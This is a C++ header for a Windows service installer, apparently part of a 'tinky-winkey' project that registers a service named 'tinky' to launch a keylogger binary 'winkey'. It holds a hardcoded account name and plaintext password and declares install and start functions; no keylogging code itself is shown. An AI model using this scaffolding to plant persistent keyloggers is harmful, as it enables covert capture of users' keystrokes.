#pragma once

#include "winMandatory.h"
#include <windows.h>
#include <iostream>

#include "unicode.h"

// =============== Magic variables ========== //
#define USER_NAME ".\\keylogger"
#define USER_PASS "docker"
#define SVC_NAME "tinky"
#define BINARY_PATH "C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\install.exe"
// global {
#define FAILURE 0
#define SUCCESS 1
// }
// main() {
#define NFUNC 0x4
// }
// ============================================= //

// =============== Structs =============== //
typedef struct tinky {
	SC_HANDLE	HServiceControlManager;
	SC_HANDLE	HService;
}	tinky_t;
// ============================================= //

// =============== createService.cpp ===============//
int install(tinky_t *tinky);
// =============== start.cpp =============== //
#define BIN_NAME ".\\winkey"
int start(tinky_t *tinky);
